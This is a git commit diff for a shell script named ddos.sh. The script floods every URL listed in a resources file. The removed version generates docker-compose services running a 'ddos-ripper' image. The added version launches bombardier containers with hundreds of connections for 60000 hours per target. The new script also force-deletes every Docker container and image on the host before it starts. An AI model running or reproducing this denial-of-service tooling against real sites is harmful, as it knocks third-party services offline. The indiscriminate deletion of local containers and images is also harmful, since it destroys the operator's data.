68502212f857465a3d7055566248ee36d5b10014
koterion <koterion317@gmail.com>
2022-02-27 15:03:40 +0200

    Update networks

--- ddos.sh
+++ ddos.sh
@@ -1,88 +1,18 @@
 #!/bin/bash
-# Ripper shell v1.0
 
-FILE="resources.txt"
-MODE="reinstall"
+docker rm -f $(docker ps -a -q)
+docker rmi -f $(docker images -q)
 
-function print_help {
-  echo -e "Usage: ddos.sh"
-  echo -e "--file|-f - filename where urls are located"
-}
+IFS=$'\n' read -d '' -r -a lines < ./resources.txt
 
-function check_params {
-  if [ -z ${FILE+x} ]; then
-    echo -e "Filename is unset, please specify filename for urls file"
-    exit 1
-  fi
-}
-
-function generate_compose {
-    echo -e "version: '3'" > docker-compose.yml
-    echo -e "services:" >> docker-compose.yml
-    counter=1
-    while read -r site_url; do
-        if [ ! -z $site_url ]; then
-            echo -e "  ddos-runner-$counter:" >> docker-compose.yml
-            echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-            echo -e "    restart: always" >> docker-compose.yml
-            echo -e "    command: $site_url" >> docker-compose.yml
-            ((counter++))
-        fi
-    done < $FILE
-}
-
-function ripper_start {
-  echo "Starting ripper attack"
-  docker-compose up -d
-}
-
-function ripper_stop {
-  echo "Stopping ripper attack"
-  docker-compose down
-}
-
-while test -n "$1"; do
-  case "$1" in
-  --help|-h)
-    print_help
-    exit
-    ;;
-  --file|-f)
-    FILE=$2
-    shift
-    ;;
-  --mode|-m)
-    MODE=$2
-    shift
-    ;;
-  *)
-    echo "Unknown argument: $1"
-    print_help
-    exit
-    ;;
-  esac
-  shift
-done
-
-check_params
-
-case $MODE in
-  install)
-    generate_compose
-    ripper_start
-    ;;
-  start)
-    ripper_start
-    ;;
-  stop)
-    ripper_stop
-    ;;
-  reinstall)
-    ripper_stop
-    generate_compose
-    ripper_start
-    ;;
-  *)
-    echo "Wrong mode"
-    exit 1
-esac
+for i in "${lines[@]}"
+do
+   echo "$i"
+   export URL=$i
+    if [ -n "$1" ]
+    then
+    docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
+    else
+    docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
+    fi
+ done
